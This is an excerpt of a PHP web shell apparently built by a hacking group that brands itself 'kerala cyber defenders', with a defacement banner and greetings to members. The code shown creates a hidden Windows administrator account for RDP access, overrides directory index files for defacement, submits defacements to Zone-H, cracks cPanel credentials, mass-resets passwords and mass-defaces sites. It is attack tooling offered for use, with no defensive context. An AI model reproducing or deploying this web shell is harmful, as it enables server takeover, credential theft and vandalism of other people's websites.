...
<html>
<head>
<title>kerala cyber defenders~KCD_HACKERS</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
< root@:kerala~cyber$defenders~# enthaa monnu >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
...
// Tapi Selebihnya, itu hasil kreasi kerala cyber defenders~KCD_HACKERS sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member kerala cyber defenders~KCD_HACKERS. & All My Friends.
###############################################################################
...
<head>
<title>kerala cyber defenders~KCD_HACKERS</title>
<meta name='author' content='kerala cyber defenders~KCD_HACKERS'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			$htaccess = "Options all\nDirectoryIndex kerala cyber defenders~KCD_HACKERS.htm\nSatisfy Any";
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/kerala cyber defenders~KCD_HACKERS/", exe("net user"))) die(color(1, 1, "[INFO] username 'kerala cyber defenders~KCD_HACKERS' already exists."));

		$add_user   = exe("net user kerala cyber defenders~KCD_HACKERS kerala cyber defenders~KCD_HACKERS /add");
    	$add_groups1 = exe("net localgroup Administrators kerala cyber defenders~KCD_HACKERS /add");
    	$add_groups2 = exe("net localgroup Administrator kerala cyber defenders~KCD_HACKERS /add");
    	$add_groups3 = exe("net localgroup Administrateur kerala cyber defenders~KCD_HACKERS /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "kerala cyber defenders~KCD_HACKERS")."<br>
    	Password: ".color(1, 2, "kerala cyber defenders~KCD_HACKERS")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://kerala cyber defenders~KCD_HACKERS.or.id/' target='_blank'>".color(1, 2, "kerala cyber defenders~KCD_HACKERS")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='kerala cyber defenders~KCD_HACKERS'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by kerala cyber defenders~KCD_HACKERS")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='kerala cyber defenders~KCD_HACKERS' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='kerala cyber defenders~KCD_HACKERS' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by kerala cyber defenders~KCD_HACKERS</textarea><br>
